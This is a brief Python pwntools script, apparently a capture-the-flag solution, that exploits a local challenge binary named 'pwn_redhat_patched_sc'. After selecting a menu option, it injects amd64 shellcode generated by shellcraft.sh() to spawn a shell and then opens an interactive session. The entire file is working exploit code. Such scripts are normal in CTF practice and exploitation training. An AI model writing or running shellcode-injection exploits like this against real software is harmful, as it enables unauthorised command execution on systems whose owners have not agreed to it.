#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.arch = 'amd64'
context.os = 'linux'

#  io = process("./pwn_redhat")
io = process("./pwn_redhat_patched_sc")

io.sendlineafter(">>>", "su")
sc = asm(shellcraft.sh())
io.sendlineafter(":", sc)
io.sendlineafter(">>>", "sh")

io.interactive()
io.close()
